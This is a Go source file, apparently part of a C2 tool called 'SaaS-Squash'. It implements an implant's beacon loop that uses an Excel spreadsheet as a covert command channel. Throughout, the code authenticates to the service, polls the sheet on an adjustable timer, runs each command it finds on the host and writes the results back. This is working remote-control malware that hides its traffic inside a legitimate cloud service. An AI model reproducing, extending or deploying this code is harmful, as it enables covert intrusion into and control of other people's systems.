package excel

import (
	"SaaS-Squash/common"
	"fmt"
	"time"
)

func UpdateSheetMeta(c2 *ExcelClient) {

	// perform authentication
	c2.Authenticate()

	// Update drive and sheet id
	c2.updateFileMeta()

}

func Run(c2 *ExcelClient) error {

	// perform authentication

	if c2.APIKey == "" {
		c2.Authenticate()
	}

	// new sheet meta
	newSheetName := c2.GenerateNewSheetName()
	c2.SheetName = newSheetName
	c2.Ticker = 30
	c2.TickerCell = "D1"
	c2.AddSheet(newSheetName)

	// Timeer for cmd loop
	tick := time.NewTicker(time.Duration(c2.Ticker) * time.Second)

	for {
		select {
		case <-tick.C:
			go func() {

				// check for reauth
				now := time.Now()
				if now.After(c2.AuthExpire) {
					// Token is expired, refresh auth
					c2.Authenticate()
				}

				// * Use /usedRange API to get all the used cells
				new_ticker, new_cmds, err := c2.GetCommandsFromSheet(c2.SheetName)
				if err != nil {
					common.AllC2Configs.Debug.LogDebug("Excel - Failed to get range from sheet : " + err.Error())
				}

				// * Check for the ticker value and update it if changed
				if c2.Ticker != new_ticker {
					common.AllC2Configs.Debug.LogDebug("Excel - New ticker found - " + fmt.Sprintf("%v", new_ticker))
					c2.Ticker = new_ticker
					if c2.Ticker == 0 {
						c2.Ticker = 30
						common.AllC2Configs.Debug.LogDebug("Excel - New value 0 found, setting to 30")
					}
					tick.Reset(time.Duration(c2.Ticker) * time.Second)
				}

				// Create commands and execute them if the output isn't set in the sheet
				if len(new_cmds) == 0 {
					common.AllC2Configs.Debug.LogDebug("Excel - No new commands")
				}
				for _, cmd := range new_cmds {
					cmd.ExecuteAndUpdate(*c2)
				}
			}()
		}
	}
}
